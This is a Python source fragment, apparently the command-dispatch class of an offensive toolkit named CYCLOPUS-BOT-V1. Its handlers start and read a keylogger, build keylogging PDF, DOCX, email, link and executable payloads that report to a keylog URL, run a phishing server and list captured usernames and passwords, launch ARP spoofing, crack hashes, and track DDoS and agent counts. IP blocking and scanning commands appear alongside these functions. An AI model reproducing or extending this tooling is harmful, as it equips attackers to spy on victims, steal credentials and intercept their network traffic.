            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
        return {'success': True, 'output': output}
    
    # ==================== KEYLOGGER ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== DEPLOYMENT COMMANDS ====================
    def _deploy_pdf(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_pdf <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_pdf_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"PDF deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_email(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: deploy_email <name> <target> <subject> <body> <keylog_url>'}
        name = args[0]
        target = args[1]
        subject = args[2]
        body = args[3]
        keylog_url = args[4]
        deployment = self.deployment.create_email_payload(name, target, subject, body, keylog_url)
        return {
            'success': True,
            'output': f"Email deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_link(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_link <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_link_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"Link deployment created: {deployment.id}\nURL: {deployment.payload}",
            'data': {'id': deployment.id, 'url': deployment.payload}
        }
    
    def _deploy_executable(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_executable <name> <target> <keylog_server>'}
        name = args[0]
        target = args[1]
        keylog_server = args[2]
        deployment = self.deployment.create_executable_payload(name, target, keylog_server)
        return {
            'success': True,
            'output': f"Executable deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_docx(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_docx <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_docx_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"DOCX deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_list(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments:
            return {'success': True, 'output': 'No deployments found'}
        output = "Deployments:\n"
        for d in deployments:
            status = "📄" if d['delivered'] else "⏳"
            output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
            output += f"     Target: {d['target']}\n"
            output += f"     Opened: {d['opened']}, Executed: {d['executed']}\n"
        return {'success': True, 'output': output}
    
    def _deploy_track(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: deploy_track <deployment_id>'}
        deployment_id = args[0]
        self.deployment.track_opened(deployment_id)
        return {'success': True, 'output': f"Tracked open for deployment {deployment_id}"}
    
    # ==================== CRACKING COMMANDS ====================
    def _crack(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        hash_type = args[0]
        hash_value = args[1]
        wordlist = args[2] if len(args) > 2 else None
        
        job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
        return {
            'success': True,
            'output': f"🔓 Cracking job started: {job_id}\nHash type: {hash_type}\nHash: {hash_value[:20]}...\nUse 'crack_status {job_id}' to check progress"
        }
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job_id = args[0]
        job = self.cracking.get_job_status(job_id)
        if not job:
            return {'success': False, 'output': f'Job {job_id} not found'}
        
        output = f"🔓 Cracking Job Status: {job_id}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    # ==================== ARP SPOOFING COMMANDS ====================
    def _arp_spoof(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <gateway_ip> [interface]'}
        target_ip = args[0]
        gateway_ip = args[1]
        interface = args[2] if len(args) > 2 else None
        
        result = self.arp_spoofing.start_spoof(target_ip, gateway_ip, interface)
        if result.status == "running":
            return {'success': True, 'output': f"🕸️ ARP spoofing started\nTarget: {target_ip}\nGateway: {gateway_ip}\nInterface: {result.interface}"}
        return {'success': False, 'output': f"Failed to start ARP spoofing"}
    
    def _arp_stop(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        spoof_id = args[0] if args else None
        if self.arp_spoofing.stop_spoof(spoof_id):
            return {'success': True, 'output': 'ARP spoofing stopped' + (f' ({spoof_id})' if spoof_id else '')}
        return {'success': False, 'output': 'Failed to stop ARP spoofing'}
    
    def _arp_status(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        active = self.arp_spoofing.get_active_spoofs()
        if not active:
            return {'success': True, 'output': 'No active ARP spoofing'}
        output = "🕸️ Active ARP Spoofs:\n"
        for s in active:
            output += f"  • {s['target_ip']} -> {s['gateway_ip']} ({s['interface']}) - {s['status']}\n"
        return {'success': True, 'output': output}
    
    def _arp_history(self, args: List[str]) -> Dict:
        if not self.arp_spoofing:
            return {'success': False, 'output': 'ARP spoofing engine not initialized'}
        limit = int(args[0]) if args else 20
        history = self.arp_spoofing.get_spoof_history(limit)
        if not history:
            return {'success': True, 'output': 'No ARP spoofing history'}
        output = "📋 ARP Spoofing History:\n"
        for h in history:
            output += f"  • {h['target_ip']} -> {h['gateway_ip']} - {h['status']} ({h['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== MAC COMMANDS ====================
    def _mac_info(self, args: List[str]) -> Dict:
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: mac_info <mac_address>'}
        mac = args[0]
        info = self.mac_manager.get_mac_info(mac)
        output = f"📡 MAC Information:\n"
        output += f"  MAC Address: {info.get('mac_address', 'Unknown')}\n"
        output += f"  Vendor: {info.get('vendor', 'Unknown')}\n"
        output += f"  IP Address: {info.get('ip_address', 'Unknown')}\n"
        output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
        output += f"  First Seen: {info.get('first_seen', 'Unknown')}\n"
        output += f"  Last Seen: {info.get('last_seen', 'Unknown')}"
        return {'success': True, 'output': output}
    
    def _mac_scan(self, args: List[str]) -> Dict:
        if not self.mac_manager:
            return {'success': False, 'output': 'MAC manager not initialized'}
        network = args[0] if args else None
        results = self.mac_manager.scan_network(network)
        if not results:
            return {'success': True, 'output': 'No devices found'}
        output = "📡 Network MAC Scan Results:\n"
        for r in results:
            output += f"  • {r['ip_address']} - {r['mac_address']} ({r['vendor']})\n"
        return {'success': True, 'output': output}
    
    def _mac_vendor(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mac_vendor <mac_address>'}
        mac = args[0]
        vendor = None
        try:
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                vendor = response.text.strip()
        except:
            pass
        
        if vendor:
            return {'success': True, 'output': f"Vendor for {mac}: {vendor}"}
        return {'success': False, 'output': f"Could not determine vendor for {mac}"}
    
    # ==================== NAT COMMANDS ====================
    def _nat_info(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        output = f"🌐 NAT Information:\n"
        output += f"  Public IP: {info.public_ip}\n"
        output += f"  Private IP: {info.private_ip}\n"
        output += f"  Router IP: {info.router_ip}\n"
        output += f"  Country: {info.country}\n"
        output += f"  ISP: {info.isp}\n"
        output += f"  NAT Type: {info.nat_type}"
        return {'success': True, 'output': output}
    
    def _nat_public(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Public IP: {info.public_ip}"}
    
    def _nat_private(self, args: List[str]) -> Dict:
        if not self.nat_info:
            return {'success': False, 'output': 'NAT info engine not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Private IP: {info.private_ip}"}
    
    # ==================== DOCKER COMMANDS ====================
    def _docker_scan(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        image = args[0]
        result = self.docker_scanner.scan_image(image)
        if result['success']:
            output = f"🐳 Docker scan of {image} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            for v in result.get('vulnerabilities', [])[:5]:
                output += f"  • {v.get('description', '')[:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        result = self.docker_scanner.docker_info()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_ps(self, args: List[str]) -> Dict:
        result = self.docker_scanner.docker_ps()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_images(self, args: List[str]) -> Dict:
        result = self.docker_scanner.docker_images()
        return {'success': result['success'], 'output': result['output']}
    
    def _docker_bench(self, args: List[str]) -> Dict:
        result = self.docker_scanner.docker_bench()
        return {'success': result['success'], 'output': result['output']}
    
    # ==================== EMAIL COMMANDS ====================
    def _email_compose(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: email_compose <to> <subject> <body> [html]'}
        to = args[0]
        subject = args[1]
        body = ' '.join(args[2:]) if len(args) > 2 else ''
        html = len(args) > 3 and args[3].lower() == 'html'
        
        email_msg = self.email_composer.compose_email(to, subject, body, html=html)
        return {
            'success': True,
            'output': f"📧 Email composed\nTo: {to}\nSubject: {subject}\nUse 'email_send <id>' to send"
        }
    
    def _email_send(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_send <email_id>'}
        email_id = int(args[0])
        result = self.email_composer.send_email(email_id)
        if result['success']:
            return {'success': True, 'output': f"📧 Email sent successfully: {result['message']}"}
        return {'success': False, 'output': f"Failed to send email: {result.get('error', 'Unknown error')}"}
    
    def _email_list(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        status = args[0] if args and args[0] in ['draft', 'sent', 'failed'] else None
        emails = self.email_composer.get_emails(status, 20)
        if not emails:
            return {'success': True, 'output': 'No emails found'}
        output = "📧 Emails:\n"
        for e in emails:
            output += f"  • ID: {e['id']} - To: {e['to_address']} - Subject: {e['subject'][:30]} - Status: {e['status']}\n"
        return {'success': True, 'output': output}
    
    def _email_delete(self, args: List[str]) -> Dict:
        if not self.email_composer:
            return {'success': False, 'output': 'Email composer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: email_delete <email_id>'}
        email_id = int(args[0])
        if self.email_composer.delete_email(email_id):
            return {'success': True, 'output': f"Email {email_id} deleted"}
        return {'success': False, 'output': f"Failed to delete email {email_id}"}
    
    # ==================== PDF REPORT COMMANDS ====================
    def _report_generate(self, args: List[str]) -> Dict:
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: report_generate <title> <target>'}
        title = args[0]
        target = args[1]
        
        analysis = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'scan_results': {},
            'recommendations': ['Review open ports', 'Check for vulnerabilities']
        }
        
        result = self.pdf_report.generate_report(title, target, analysis)
        if result['success']:
            return {'success': True, 'output': f"📊 PDF Report generated: {result['file_path']}"}
        return {'success': False, 'output': f"Failed to generate report: {result.get('error', 'Unknown error')}"}
    
    def _report_list(self, args: List[str]) -> Dict:
        if not self.pdf_report:
            return {'success': False, 'output': 'PDF report generator not initialized'}
        reports = self.pdf_report.get_reports(20)
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "📊 PDF Reports:\n"
        for r in reports:
            output += f"  • {r['title']} - {r['target']} - {r['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    # ==================== PLATFORM COMMANDS ====================
    def _platform_send(self, args: List[str]) -> Dict:
        if not self.platform_executor:
            return {'success': False, 'output': 'Platform executor not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: platform_send <platform> <command>'}
        platform = args[0]
        command = ' '.join(args[1:])
        result = self.platform_executor.execute_on_platform(platform, command)
        return result
    
    def _platform_status(self, args: List[str]) -> Dict:
        if not self.platform_executor:
            return {'success': False, 'output': 'Platform executor not initialized'}
        platforms = self.platform_executor.platforms
        if not platforms:
            return {'success': True, 'output': 'No platforms registered'}
        output = "📱 Platform Status:\n"
        for name, bot in platforms.items():
            status = "🟢 Running" if bot.running else "🔴 Stopped"
            output += f"  • {name}: {status}\n"
        return {'success': True, 'output': output}
    
    def _platform_results(self, args: List[str]) -> Dict:
        if not self.platform_executor:
            return {'success': False, 'output': 'Platform executor not initialized'}
        limit = int(args[0]) if args else 50
        results = self.platform_executor.get_results(limit)
        if not results:
            return {'success': True, 'output': 'No platform results found'}
        output = "📋 Platform Command Results:\n"
        for r in results:
            output += f"  • {r['id']}: {r['result'].get('success', False)}\n"
        return {'success': True, 'output': output}
    
    # ==================== SOCIAL ENGINEERING ====================
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _list_templates(self, args: List[str]) -> Dict:
        templates = self.social.get_available_templates()
        if not templates:
            return {'success': True, 'output': 'No templates found'}
        output = "🎣 Available Phishing Templates:\n"
        for t in templates:
            output += f"  • {t}\n"
        return {'success': True, 'output': output}
    
    def _view_template(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: view_template <name>'}
        name = args[0]
        template = self.db.get_phishing_template(name)
        if not template:
            return {'success': False, 'output': f"Template '{name}' not found"}
        output = f"📄 Template: {name}\n"
        output += f"Category: {template.get('category', 'unknown')}\n"
        output += f"Updated: {template.get('updated_at', 'unknown')}\n"
        output += f"\n{template.get('html_content', '')[:2000]}"
        return {'success': True, 'output': output}
    
    def _edit_template(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: edit_template <name> <html_file>'}
        name = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            
            if self.social.update_template(name, html_content):
                return {'success': True, 'output': f"Template '{name}' updated successfully"}
            return {'success': False, 'output': f"Failed to update template '{name}'"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _create_template(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: create_template <name> <html_file>'}
        name = args[0]
        html_file = args[1]
        
        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
            
            if self.social.create_custom_template(name, html_content):
                return {'success': True, 'output': f"Custom template '{name}' created successfully"}
            return {'success': False, 'output': f"Failed to create template '{name}'"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _delete_template(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: delete_template <name>'}
        name = args[0]
        
        if self.social.delete_template(name):
            return {'success': True, 'output': f"Template '{name}' deleted successfully"}
        return {'success': False, 'output': f"Failed to delete template '{name}'"}
    
    # ==================== SCAN COMMANDS ====================
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    # ==================== IP MANAGEMENT ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        
        domain = self.tools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, None, None, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return {'success': True, 'output': f'✅ IP {ip} removed'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            domain = self.tools.ip_to_domain(ip)
            
            output = f"🔍 IP Information: {ip}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        
        output = f"🐙 CYCLOPUS-BOT-V1 IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== SYSTEM COMMANDS ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🐙 CYCLOPUS-BOT-V1 System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DDoS Attacks: {stats.get('total_ddos_attacks', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
  MAC Entries: {stats.get('total_mac_entries', 0)}
  NAT Entries: {stats.get('total_nat_entries', 0)}
  Emails: {stats.get('total_emails', 0)}
  PDF Reports: {stats.get('total_pdf_reports', 0)}
  Payloads: {stats.get('total_payloads', 0)}
  Agents: {stats.get('total_agents', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        
        report = f"""
🐙 CYCLOPUS-BOT-V1 Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
